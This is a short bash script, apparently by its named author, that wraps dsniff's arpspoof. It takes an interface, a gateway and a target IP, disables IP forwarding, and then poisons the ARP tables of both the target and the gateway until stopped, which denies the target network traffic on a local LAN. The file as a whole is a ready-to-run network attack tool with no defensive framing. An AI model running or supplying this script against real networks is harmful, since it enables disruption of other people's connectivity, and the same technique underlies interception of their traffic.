#!/bin/bash

##########################################################"
#                                                        #"
#           aushv1.0 - dsniff arpspoof Utilitary         #"
#                                                        #"
# Created by Lucas Andrade <slucasandrade@protonmail.ch> #"
#                                                        #"
##########################################################"

export RED='\033[1;91m'
export ORIGIN='\033[1;00m'
export BLUE='\033[1;94m'

spoofing() {
		
		sleep 1
		echo " "

		echo "Assigning 0 to port forward value to deny traffic...";sleep 1
		sysctl -w net.ipv4.ip_forward=0;sleep 2;echo " "

		echo "Poisoning the ARP table with ARP replies...";sleep 2;echo " "
		echo "Type 'Ctrl + C' to stop the replies and exit...";sleep 2;echo " "

		echo "### After exiting, the rest of the logs may appear on the screen, be patient and press enter :) ###"
		echo " ";sleep 2

		#arpspoofing with dsniff
		arpspoof -i $mod -t $target $gw &
		arpspoof -i $mod -t $gw $target &
		sleep 9999999
}

echo " "
echo -e "$BLUE #> This simple script was made to be used as an utilitary to deny traffic in your LAN using dsniff arpspoof," >&2
echo -e " #> see https://www.mankier.com/8/arpspoof to more details." >&2
echo -e " #> Created by Lucas Andrade :) $ORIGIN" >&2
echo " "

# Make sure only users that got root permissions run this script

if [ $(id -u) -ne 0 ]; then
 	echo " "
	echo -e "$RED This script has to be runned with root permissions! $ORIGIN" >&2
	echo " "
	exit 1;

else

	#Getting variables
		echo "Enter the interface module to be used:";read mod;echo " "
		echo "Enter the network gateway:";read gw;echo " "
    	echo "Enter the target IP:";read target;echo " "

	# Make sure variables are OK

	if [[ $gw =~ ^192.168\.[0-9]{1,3}\.[0-9]{1,3}$ || $gw =~ 10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ || $gw =~ 172.16\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then

		spoofing

	else

		echo "Probably the gateway or target is wrong, check them and execute it again!";
		exit 1;

    fi
fi

exit 0
